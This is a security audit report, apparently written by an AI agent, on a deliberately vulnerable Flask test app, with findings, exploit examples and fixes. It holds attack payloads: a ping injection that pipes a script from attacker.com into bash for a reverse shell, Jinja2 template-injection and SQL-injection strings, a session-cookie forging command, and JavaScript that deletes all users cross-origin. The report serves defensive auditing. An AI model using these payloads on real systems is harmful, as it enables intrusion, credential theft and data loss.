# Security Investigation Report

**Target:** `./test-app`
**Date:** 2026-05-04
**Agent:** Claude Security Investigator (TypeScript) v1.1
**Files analyzed:** 3 (`app.py`, `requirements.txt`, `README.md`)

---

## Executive Summary

This Flask 2.0.1 application is critically insecure across every attack surface examined. After merging and deduplicating findings from both audit subagents, 22 unique issues were identified: **9 Critical, 8 High, 3 Medium, 1 Low** (one finding — CVE-2020-25032 against flask-cors — was dropped as a false positive since 3.0.10 is later than the patched 3.0.9 release). Three independent, unauthenticated paths to full Remote Code Execution exist simultaneously: OS command injection in `/ping`, Jinja2 Server-Side Template Injection in `/render`, and the Werkzeug interactive debugger exposed on all network interfaces. Every admin endpoint is unauthenticated, both SQL query sites are injectable, all production secrets are hardcoded in source code, and every pinned dependency carries unpatched CVEs. This application must not be exposed to any network until all Critical findings are resolved.

---

## Critical Findings

### [CRITICAL-1] Command Injection in `/ping` — Unauthenticated RCE
**ID:** CA-3
**Location:** `app.py:107–109`
**Description:** The `host` GET parameter is interpolated directly into a shell command string and executed with `subprocess.run(..., shell=True)`. Any shell metacharacter causes the shell to interpret attacker-controlled code. No authentication, validation, or sandboxing is present.

**Evidence:**
```python
host = request.args.get("host", "localhost")
result = subprocess.run(
    f"ping -c 1 {host}", shell=True, capture_output=True, text=True
)
return jsonify({"output": result.stdout, "error": result.stderr})
```

**Exploitability:** Trivially reachable, zero prerequisites.
- `GET /ping?host=localhost;id` — executes `id`, output in JSON response
- `GET /ping?host=localhost;curl+http://attacker.com/shell.sh|bash` — drops a reverse shell

**Remediation:** Pass arguments as a list with `shell=False`; validate host against an allowlist regex.

**Suggested Fix:**
```python
import re

SAFE_HOST_RE = re.compile(r'^[a-zA-Z0-9.\-]{1,253}$')

@app.route("/ping")
def ping():
    host = request.args.get("host", "localhost")
    if not SAFE_HOST_RE.match(host):
        return jsonify({"error": "Invalid host"}), 400
    result = subprocess.run(
        ["ping", "-c", "1", host],   # shell=False — no shell expansion
        capture_output=True, text=True, timeout=5
    )
    return jsonify({"output": result.stdout, "error": result.stderr})
```

---

### [CRITICAL-2] Server-Side Template Injection in `/render` — Unauthenticated RCE
**ID:** CA-4
**Location:** `app.py:115–118`
**Description:** User input from the `name` GET parameter is concatenated into a Jinja2 template string, then processed by `render_template_string()`. Jinja2 executes `{{ ... }}` expressions embedded in the template source, including Python object-graph traversal chains that achieve full OS-level code execution. No authentication required.

**Evidence:**
```python
name = request.args.get("name", "world")
template = "<h1>Hello, " + name + "!</h1>"
return render_template_string(template)
```

**Exploitability:**
- `GET /render?name={{config}}` → dumps `SECRET_KEY`, `API_KEY`, `DB_PASSWORD` from the Flask config dict
- `GET /render?name={{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()}}` → arbitrary OS command execution

**Remediation:** Pass user data as a Jinja2 *variable*, never as part of the template string itself.

**Suggested Fix:**
```python
from markupsafe import escape

@app.route("/render")
def render():
    name = request.args.get("name", "world")
    # name is a variable — not part of the template source — so Jinja2 cannot interpret it
    return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
```
Jinja2 auto-escapes variables in HTML context; `escape()` is a belt-and-suspenders addition.

---

### [CRITICAL-3] SQL Injection in `/login` — Authentication Bypass
**ID:** CA-1
**Location:** `app.py:57–65`
**Description:** The `username` field from the JSON body is concatenated directly into a SQL query string. An attacker injects SQL to short-circuit the `AND` clause and authenticate as any user — including admin — without knowing any valid password.

**Evidence:**
```python
query = (
    "SELECT * FROM users WHERE username = '"
    + username
    + "' AND password_hash = '"
    + password_hash
    + "'"
)
row = conn.execute(query).fetchone()
```

**Exploitability:**
```
POST /login   Content-Type: application/json
{"username": "' OR '1'='1' --", "password": "anything"}
```
Returns the first user row (admin). Zero authentication required.

**Remediation:** Use SQLite3 parameterized queries with `?` placeholders.

**Suggested Fix:**
```python
row = conn.execute(
    "SELECT * FROM users WHERE username = ? AND password_hash = ?",
    (username, password_hash)
).fetchone()
```

---

### [CRITICAL-4] SQL Injection in `/search` — Full Database Exfiltration
**ID:** CA-2
**Location:** `app.py:77–81`
**Description:** The `q` GET parameter is concatenated into a `LIKE` query without parameterization. A UNION-based injection exfiltrates any column from any table — password hashes, roles, all user data — without authentication.

**Evidence:**
```python
rows = conn.execute(
    "SELECT id, username FROM users WHERE username LIKE '%" + term + "%'"
).fetchall()
```

**Exploitability:**
```
GET /search?q=%25' UNION SELECT password_hash,username FROM users WHERE '1'='1
```
Dumps all password hashes in the JSON response. Combined with MD5 weakness (HIGH-1), plaintext passwords follow in seconds.

**Remediation:** Parameterize the LIKE query; construct `%` wildcards in Python before binding.

**Suggested Fix:**
```python
rows = conn.execute(
    "SELECT id, username FROM users WHERE username LIKE ?",
    ('%' + term + '%',)
).fetchall()
```

---

### [CRITICAL-5] Missing Authentication on `/admin/users` — User Enumeration
**ID:** CA-5
**Location:** `app.py:85–91`
**Description:** The admin user-list endpoint has no authentication, session check, or authorization guard. Any anonymous HTTP client enumerates every account including roles and numeric IDs.

**Evidence:**
```python
@app.route("/admin/users")
def admin_list_users():
    conn = get_db()
    rows = conn.execute("SELECT id, username, role FROM users").fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])
```

**Exploitability:** `GET /admin/users` returns the full user database — IDs, usernames, roles — to any caller. Provides the target ID list needed to drive the unauthenticated delete endpoint.

**Remediation:** Gate all `/admin/*` routes behind a `@require_admin` decorator that validates session state and `role == "admin"`.

**Suggested Fix:**
```python
from functools import wraps
from flask import session

def require_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        user_id = session.get("user_id")
        if not user_id:
            return jsonify({"error": "Authentication required"}), 401
        conn = get_db()
        row = conn.execute(
            "SELECT role FROM users WHERE id = ?", (user_id,)
        ).fetchone()
        conn.close()
        if not row or row["role"] != "admin":
            return jsonify({"error": "Forbidden"}), 403
        return f(*args, **kwargs)
    return decorated

@app.route("/admin/users")
@require_admin
def admin_list_users():
    ...
```
Also update `/login` to write `session["user_id"] = row["id"]` on successful authentication.

---

### [CRITICAL-6] Missing Authentication on `/admin/delete/<id>` — Unauthenticated Account Deletion
**ID:** CA-6
**Location:** `app.py:93–100`
**Description:** The user-deletion endpoint accepts a POST by integer ID with no authentication. Any unauthenticated caller can delete any user — including the admin account — in a single request.

**Evidence:**
```python
@app.route("/admin/delete/<int:user_id>", methods=["POST"])
def admin_delete_user(user_id):
    conn = get_db()
    conn.execute("DELETE FROM users WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({"status": "deleted", "id": user_id})
```

**Exploitability:** `POST /admin/delete/1` deletes the admin account. Combined with CRITICAL-5, an attacker enumerates all IDs and wipes the entire user table in seconds. (Note: the `DELETE` itself correctly uses parameterized queries — the vulnerability is in the missing auth gate, not the query.)

**Remediation:** Apply the `@require_admin` decorator from CRITICAL-5.

**Suggested Fix:**
```python
@app.route("/admin/delete/<int:user_id>", methods=["POST"])
@require_admin
def admin_delete_user(user_id):
    ...
```

---

### [CRITICAL-7] Hardcoded Production Secrets in Source Code
**ID:** CA-9 / DC-11 (merged)
**Location:** `app.py:13–15`
**Description:** Three production secrets are hardcoded as string literals: a live production API key, a database password, and the session signing secret. Any person with repository access — developer, CI runner, attacker who exploits any path-disclosure vulnerability — immediately obtains all three.

**Evidence:**
```python
API_KEY    = "sk-prod-7c4e9f2a1b8d3e6f5a9c0d4e8f1b2a7c"
DB_PASSWORD = "admin123"
JWT_SECRET  = "supersecret"
```

**Exploitability:** The `JWT_SECRET` value is used directly as Flask's `SECRET_KEY` (line 20), enabling offline forging of admin session cookies (see CRITICAL-8). The `sk-prod-*` API key is a live credential that may grant access to downstream services and must be treated as compromised immediately.

**Remediation:** Move all secrets to environment variables; rotate the API key now.

**Suggested Fix:**
```python
import os, secrets as _secrets

API_KEY     = os.environ["API_KEY"]              # hard fail if absent
DB_PASSWORD = os.environ["DB_PASSWORD"]
JWT_SECRET  = os.environ.get("SECRET_KEY") or _secrets.token_hex(32)
```
Add `python-dotenv` for local development; use your deployment platform's secrets manager in production. Add `.env` to `.gitignore` and commit a `.env.example` template.

---

### [CRITICAL-8] Hardcoded Flask `SECRET_KEY` — Session Cookie Forgery
**ID:** CA-14 / DC-13 (merged)
**Location:** `app.py:20`
**Description:** `app.config["SECRET_KEY"]` is set to the hardcoded string `"supersecret"`. Flask uses this key to sign session cookies with `itsdangerous`. An attacker who knows this value (it is in the source code) can forge a valid session cookie for any user, including admin, without ever contacting the login endpoint.

**Evidence:**
```python
JWT_SECRET = "supersecret"
app.config["SECRET_KEY"] = JWT_SECRET
```

**Exploitability:**
```bash
# Using flask-unsign (pip install flask-unsign):
flask-unsign --sign --secret 'supersecret' \
  --cookie '{"user_id": 1, "role": "admin"}'
# Paste the resulting cookie into any request → instant admin session
```
This bypass survives all future auth patches until the key is rotated and externalized.

**Remediation:** Generate a cryptographically random key from the environment.

**Suggested Fix:**
```python
import os, secrets as _secrets
app.config["SECRET_KEY"] = os.getenv("FLASK_SECRET_KEY") or _secrets.token_hex(32)
```
Set `FLASK_SECRET_KEY` to a securely generated 256-bit hex value in production. Rotate it immediately — treat all existing sessions as compromised.

---

### [CRITICAL-9] Flask Debug Mode Enabled + Bound to All Network Interfaces
**ID:** CA-10 / DC-9 / CA-11 / DC-10 (merged)
**Location:** `app.py:19`, `app.py:135`
**Description:** `DEBUG=True` is hardcoded in two places and the server binds to `0.0.0.0:5000`. On any unhandled exception, Werkzeug exposes an interactive Python console accessible over the network. This is a third, independent path to full RCE beyond CRITICAL-1 and CRITICAL-2. The Werkzeug debugger PIN can be computed deterministically from `/proc/self/cgroup` and machine identifiers on Linux cloud instances.

**Evidence:**
```python
app.config["DEBUG"] = True          # line 19
app.run(host="0.0.0.0", port=5000, debug=True)   # line 135
```

**Exploitability:** Trigger any uncaught exception → access Werkzeug interactive console over the network → execute arbitrary Python as the web-server process. Exceptions are trivially induced (malformed JSON to `/login`, invalid route, deliberate injection).

**Remediation:** Read `DEBUG` and host from environment variables; default to `False` / `127.0.0.1`. Use a WSGI server (Gunicorn, uWSGI) in production — never the Flask development server.

**Suggested Fix:**
```python
import os
app.config["DEBUG"] = os.getenv("FLASK_DEBUG", "false").lower() == "true"

if __name__ == "__main__":
    init_db()
    app.run(
        host=os.getenv("FLASK_HOST", "127.0.0.1"),
        port=int(os.getenv("FLASK_PORT", "5000")),
        debug=app.config["DEBUG"]
    )
# Production deployment:
# gunicorn --bind 127.0.0.1:5000 --workers 4 app:app
```

---

## High Findings

### [HIGH-1] Weak Password Hashing — Unsalted MD5
**ID:** CA-7
**Location:** `app.py:54`
**Description:** All passwords are hashed with raw, unsalted MD5. MD5 produces billions of hashes per second on commodity GPUs; without a salt, every identical password produces the same hash and precomputed rainbow tables apply.

**Evidence:**
```python
password_hash = hashlib.md5(password.encode()).hexdigest()
```

**Exploitability:** After dumping hashes via CRITICAL-4, submit them to any online MD5 rainbow table or run `hashcat -m 0` against a wordlist. The admin hash `0192023a7bbd73250516f069df18b500` is the MD5 of `admin123` and resolves instantly in any rainbow table lookup.

**Remediation:** Replace MD5 with `bcrypt` (or `werkzeug.security.generate_password_hash`).

**Suggested Fix:**
```python
# requirements.txt: add  bcrypt>=4.0.0
import bcrypt

def hash_password(pw: str) -> str:
    return bcrypt.hashpw(pw.encode(), bcrypt.gensalt()).decode()

def verify_password(pw: str, stored: str) -> bool:
    return bcrypt.checkpw(pw.encode(), stored.encode())

# In /login: compare against stored hash — don't query by hash value
row = conn.execute(
    "SELECT * FROM users WHERE username = ?", (username,)
).fetchone()
if row and verify_password(password, row["password_hash"]):
    return jsonify({"status": "ok", "user": dict(row)})
return jsonify({"status": "invalid"}), 401
```

---

### [HIGH-2] Hardcoded Admin Password (MD5 of "admin123") in DB Seed
**ID:** CA-8
**Location:** `app.py:40–41`
**Description:** `init_db()` seeds the admin account with the MD5 hash of `admin123` — a value present in every common rainbow table and immediately reversible. Any reader of the source code knows the admin password without cracking.

**Evidence:**
```python
VALUES ('admin', '0192023a7bbd73250516f069df18b500', 'admin');
-- MD5("admin123") = 0192023a7bbd73250516f069df18b500
```

**Exploitability:** Low-severity in isolation (requires source access or a DB dump), but amplifies to Critical when chained with either SQL injection finding (HIGH-1 + CRITICAL-4 = instant full credential compromise).

**Remediation:** Derive the admin hash at startup from an environment variable using bcrypt.

**Suggested Fix:**
```python
admin_hash = hash_password(os.environ["ADMIN_PASSWORD"])
conn.execute(
    "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?,?,?)",
    ("admin", admin_hash, "admin")
)
```

---

### [HIGH-3] Stack Traces Returned to HTTP Clients — Information Disclosure
**ID:** CA-13
**Location:** `app.py:121–129`
**Description:** The global exception handler serializes the complete Python traceback into the HTTP response body. Every unhandled error leaks internal file paths, module names, SQL query fragments, library versions, and any secrets that appear in local variable scope at crash time.

**Evidence:**
```python
@app.errorhandler(Exception)
def handle_error(e):
    import traceback
    return (
        jsonify({"error": str(e), "trace": traceback.format_exc()}),
        500,
    )
```

**Exploitability:** Reachable with no authentication. Sending malformed JSON to `/login`, an out-of-range ID to `/admin/delete`, or a deliberately broken SQL fragment induces a 500 that reveals the DB file path, query structure, and surrounding code. This materially assists all other attacks by mapping the application's internals.

**Remediation:** Log the traceback server-side; return a generic message to clients.

**Suggested Fix:**
```python
import logging
logger = logging.getLogger(__name__)

@app.errorhandler(Exception)
def handle_error(e):
    logger.exception("Unhandled exception")
    return jsonify({"error": "An internal error occurred"}), 500
```

---

### [HIGH-4] Permissive CORS — Wildcard Origin with `supports_credentials=True`
**ID:** CA-12 / DC-12 (merged)
**Location:** `app.py:21`
**Description:** `flask-cors` is configured with `origins="*"` and `supports_credentials=True`. Rather than emitting `Access-Control-Allow-Origin: *` (which browsers reject alongside `Access-Control-Allow-Credentials: true`), flask-cors **reflects the incoming `Origin` header** when credentials are enabled — granting every domain credentialed CORS access.

**Evidence:**
```python
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)
```

**Exploitability:** Once session-based auth is added (fixing CRITICAL-5/6), a malicious page on any domain can silently call credentialed endpoints in a victim's browser session — including administrative actions. The flask-cors CVEs (MEDIUM-1 through MEDIUM-3) make the origin-matching bypass possible even after switching to an explicit allowlist.

**Remediation:** Replace wildcard with an explicit origin allowlist read from environment; optionally remove `supports_credentials` if cross-origin requests do not require cookies.

**Suggested Fix:**
```python
allowed_origins = os.getenv("CORS_ORIGINS", "").split(",")
CORS(app,
     resources={r"/*": {"origins": [o.strip() for o in allowed_origins if o.strip()]}},
     supports_credentials=True)
```

---

### [HIGH-5] Flask 2.0.1 — CVE-2023-30861: Session Cookie Cache Poisoning
**ID:** DC-1
**Location:** `requirements.txt:1`
**Description:** Flask before 2.3.2 does not emit a `Vary: Cookie` header on responses containing `Set-Cookie`. A caching reverse proxy in front of the application may cache such a response and serve one user's session cookie to a different user.

**Evidence:**
```
Flask==2.0.1
```

**Exploitability:** Exploitable passively in deployments behind CDNs, nginx `proxy_cache`, or Varnish. No active attacker traffic is required; the proxy performs the cross-contamination automatically under normal load.

**Remediation:** Upgrade Flask to ≥ 2.3.2.

**Suggested Fix:**
```
# requirements.txt
Flask>=2.3.2
Werkzeug>=2.3.6   # compatible Werkzeug required alongside Flask 2.3.x
```

---

### [HIGH-6] Werkzeug 2.0.1 — CVE-2023-25577: Multipart Form DoS
**ID:** DC-6
**Location:** `requirements.txt:3`
**Description:** Werkzeug before 2.2.3 imposes no limit on the number of parts in a `multipart/form-data` request. A single crafted request with millions of parts exhausts CPU and memory across all worker processes, causing a denial of service.

**Evidence:**
```
Werkzeug==2.0.1
```

**Exploitability:** No authentication required. Any multipart-capable POST endpoint — including `/login` if its content-type is changed — can be targeted. A single request can hang a worker indefinitely.

**Remediation:** Upgrade Werkzeug to ≥ 3.0.3 (also resolves CVE-2023-46136 and CVE-2023-23934). Add `MAX_CONTENT_LENGTH` as defence-in-depth.

**Suggested Fix:**
```
# requirements.txt
Werkzeug>=3.0.3
```
```python
app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024  # 16 MB hard cap
```

---

### [HIGH-7] Missing Security Response Headers — XSS, Clickjacking, MitM
**ID:** DC-14
**Location:** `app.py` (no `after_request` hook present)
**Description:** The application sets none of the standard browser security headers: no `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, or `Referrer-Policy`. Flask 2.0.1 does not add these by default.

**Evidence:** No `after_request` handler and no `flask-talisman` configuration in `app.py`.

**Exploitability:** Without CSP, any XSS payload (e.g. injected via SSTI or a future reflected-XSS vector) executes with full page privileges. Without `X-Frame-Options`, clickjacking attacks can overlay the app in an iframe. Without HSTS, traffic can be downgraded from HTTPS on a network-adjacent attacker.

**Remediation:** Add an `after_request` hook or install `flask-talisman`.

**Suggested Fix:**
```python
@app.after_request
def set_security_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Content-Security-Policy"] = "default-src 'self'; object-src 'none'"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    return response
```

---

### [HIGH-8] No Rate Limiting on `/login` — Brute-Force Attack Vector
**ID:** DC-15
**Location:** `app.py:48–70`
**Description:** The `/login` endpoint accepts an unlimited number of requests per IP with no throttle, account lockout, or CAPTCHA. Combined with unsalted MD5 hashing, an attacker can also verify cracked hashes directly online with no risk of detection or blocking.

**Evidence:**
```python
@app.route("/login", methods=["POST"])
def login():
    # No rate limiting, no account lockout
```

**Exploitability:** Automated credential stuffing or password spraying has zero friction. When chained with CRITICAL-3 (SQL injection auth bypass), brute force is entirely unnecessary — but the endpoint is also vulnerable to it independently.

**Remediation:** Apply per-IP rate limiting with `flask-limiter`.

**Suggested Fix:**
```python
# requirements.txt: add flask-limiter>=3.0.0
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app=app, key_func=get_remote_address,
                  default_limits=["200 per day", "50 per hour"])

@app.route("/login", methods=["POST"])
@limiter.limit("5 per minute")
def login():
    ...
```
In production, back the limiter with Redis (`storage_uri="redis://..."`) so limits are shared across all workers.

---

## Medium Findings

### [MEDIUM-1] flask-cors 3.0.10 — CVE-2024-6221: Private Network Access Exposure
**ID:** DC-3
**Location:** `requirements.txt:2`
**Description:** flask-cors ≤4.0.1 sets `Access-Control-Allow-Private-Network: true` by default. This allows public web pages to make browser-mediated cross-origin requests into the private network where this Flask app runs.

**Evidence:** `flask-cors==3.0.10`

**Exploitability:** An attacker's public website instructs a victim's browser to probe the internal network via the Private Network Access protocol. Internal services become reachable without any special network position.

**Remediation:** Upgrade flask-cors to ≥ 5.0.2.

---

### [MEDIUM-2] flask-cors 3.0.10 — CVE-2024-6839: Regex Priority Confusion
**ID:** DC-4
**Location:** `requirements.txt:2`
**Description:** flask-cors ≤5.0.1 prioritizes longer regex patterns over more specific ones, causing less restrictive CORS policies to be applied to sensitive endpoints when multiple resource patterns are configured.

**Evidence:** `flask-cors==3.0.10`

**Exploitability:** An attacker crafts request paths matching a broad, permissive regex instead of the intended narrow rule, bypassing CORS restrictions on protected endpoints.

**Remediation:** Upgrade flask-cors to ≥ 5.0.2.

---

### [MEDIUM-3] flask-cors 3.0.10 — CVE-2024-6866: Case-Insensitive Path Matching Bypass
**ID:** DC-5
**Location:** `requirements.txt:2`
**Description:** flask-cors ≤5.0.1 performs case-insensitive URL path matching (a function meant for hostnames), allowing mixed-case request paths (e.g. `/Admin/users`) to bypass CORS restrictions applied to `/admin/users`.

**Evidence:** `flask-cors==3.0.10`

**Exploitability:** Attacker uses `/Admin/delete/1` instead of `/admin/delete/1` to bypass path-specific CORS restrictions after they are tightened.

**Remediation:** Upgrade flask-cors to ≥ 5.0.2. (Single upgrade resolves MEDIUM-1, MEDIUM-2, and MEDIUM-3.)

**Suggested Fix:**
```
# requirements.txt — one change resolves all three flask-cors medium findings
flask-cors>=5.0.2
```

---

## Low Findings

### [LOW-1] Werkzeug 2.0.1 — CVE-2023-23934: `__Host-` Cookie Prefix Bypass
**ID:** DC-8
**Location:** `requirements.txt:3`
**Description:** Werkzeug before 2.2.3 misparses nameless cookies (e.g. `=value`), allowing a `__Host-` security-prefix to be bypassed by an attacker who controls a sibling subdomain.

**Evidence:** `Werkzeug==2.0.1`

**Exploitability:** Requires the attacker to control a subdomain of the application's host and the application to use `__Host-` prefixed cookies (it does not currently). Low practical impact in this specific configuration.

**Remediation:** Resolved by upgrading Werkzeug to ≥ 3.0.3 (already recommended in HIGH-6 — no additional action required).

---

## Vulnerability Chains

### Chain A — Unauthenticated Full Credential Dump in One Request
**Findings:** CRITICAL-4 (SQL injection `/search`) → HIGH-1 (Unsalted MD5) → HIGH-2 (Hardcoded admin hash)

`GET /search?q=%25' UNION SELECT password_hash,username FROM users WHERE '1'='1` extracts every password hash without authentication. Because passwords are unsalted MD5, **all hashes reverse to plaintext within seconds** using free online rainbow tables; the admin hash (`admin123`) resolves instantly. An attacker has every user's plaintext password in under one minute, starting with zero knowledge and zero credentials.

---

### Chain B — Three Independent Unauthenticated Paths to Full Server RCE
**Findings:** CRITICAL-1 (Command injection) + CRITICAL-2 (SSTI) + CRITICAL-9 (Debug mode + 0.0.0.0)

Three fully independent RCE vectors exist simultaneously:
1. `/ping?host=x;id` → OS command execution via shell injection
2. `/render?name={{...}}` → Python object traversal via Jinja2
3. Any exception → Werkzeug interactive Python console, network-accessible on `0.0.0.0`

Patching one leaves two others. All three require zero authentication, zero prior knowledge, and a single HTTP request. The server is fully compromised from **any host that can reach port 5000**.

---

### Chain C — Cross-Origin Silent Account Wipe (CSRF via Reflected CORS)
**Findings:** CRITICAL-5 (Missing auth `/admin/users`) + CRITICAL-6 (Missing auth `/admin/delete`) + HIGH-4 (Wildcard CORS with credentials)

flask-cors reflects the `Origin` header when `supports_credentials=True`, so any domain gets credentialed cross-origin access. A malicious page silently enumerates all user IDs from `/admin/users`, then deletes every account via `/admin/delete/<id>` — all in the victim's browser session, triggered by a single page visit:

```javascript
// Executes silently while victim has the app open in another tab
fetch('http://app.internal:5000/admin/users', {credentials: 'include'})
  .then(r => r.json())
  .then(users => users.forEach(u =>
    fetch(`http://app.internal:5000/admin/delete/${u.id}`,
          {method: 'POST', credentials: 'include'})
  ));
```

---

### Chain D — Known `SECRET_KEY` Survives All Future Auth Patches
**Findings:** CRITICAL-8 (Hardcoded `SECRET_KEY = "supersecret"`) → Any auth added to fix CRITICAL-5/6

Even after SQL injection and missing-auth findings are patched, an attacker who has read the source code (or guessed `"supersecret"`) retains persistent admin access by forging Flask session cookies offline. The forged cookie is accepted by any auth decorator that validates `session["user_id"]` and `session["role"]`. **This bypass is invisible in access logs and survives all future auth fixes until the key is rotated and externalized.**

---

## Positive Observations

- **`/admin/delete` already uses parameterized queries** (`conn.execute("DELETE FROM users WHERE id = ?", (user_id,))`) — the developer knows the correct pattern; the injection bugs elsewhere are oversights, not ignorance.
- **`<int:user_id>` route converter** on the delete endpoint rejects non-integer IDs at the Flask routing layer before any application code runs.
- **Small dependency footprint** — only three packages in `requirements.txt`, making the upgrade surface minimal and auditable in an afternoon.
- **Honest inline documentation** — `# === Vuln: ... ===` comments throughout `app.py` make every vulnerability self-documenting; the `README.md` clearly warns against deployment.
- **Global error handler exists** — the structure is correct; only the response payload (returning the traceback) needs to be changed.

---

## Recommendations

1. **[Immediate — 5 min]** Take the application offline or firewall port 5000 from all non-localhost traffic. Three independent unauthenticated RCE paths exist; no partial patch makes this safe to expose.

2. **[Immediate — 15 min]** Fix both RCE-from-HTTP endpoints: replace `shell=True` with an argument list in `/ping`; pass `name` as a Jinja2 variable in `/render`. These are one- or two-line changes each.

3. **[Immediate — 5 min]** Disable debug mode and restrict the bind host: `DEBUG = os.getenv(..., "false")`, `host = os.getenv("FLASK_HOST", "127.0.0.1")`. Eliminates the third RCE vector.

4. **[Immediate — 15 min]** Parameterize both injectable `conn.execute()` calls using the `?` placeholder pattern already present in `admin_delete_user`. Two-line fix per query.

5. **[Same day — 30 min]** Externalize all secrets to environment variables and **immediately revoke and rotate the `sk-prod-*` API key** — treat it as compromised. Generate a cryptographically random `FLASK_SECRET_KEY`; invalidate all existing sessions.

6. **[Same day — 1–2 hr]** Add the `@require_admin` decorator to both `/admin/*` routes; update `/login` to write `session["user_id"]` on success.

7. **[Same day — 10 min]** Upgrade all three dependencies to patched versions:
   ```
   Flask>=2.3.2
   flask-cors>=5.0.2
   Werkzeug>=3.0.3
   ```
   This resolves CVE-2023-30861, CVE-2024-6221, CVE-2024-6839, CVE-2024-6866, CVE-2023-25577, CVE-2023-46136, and CVE-2023-23934 in a single `pip install -r requirements.txt`.

8. **[This week — 1 hr]** Replace MD5 with bcrypt for all password hashing; regenerate the admin seed from `os.environ["ADMIN_PASSWORD"]`; require a password reset for all existing users since existing MD5 hashes must be treated as cracked.

9. **[This week — 30 min]** Suppress tracebacks from HTTP responses (log server-side); add the security headers `after_request` hook; restrict CORS to an explicit origin allowlist.

10. **[This week — 30 min]** Add `flask-limiter` with a 5-per-minute limit on `/login`; add `app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024` as multipart-DoS defence.

11. **[Ongoing]** Add `pip-audit` or `safety check` as a CI step to detect newly published CVEs against pinned dependencies automatically. Deploy via Gunicorn behind nginx — never the Flask development server — in all non-local environments.
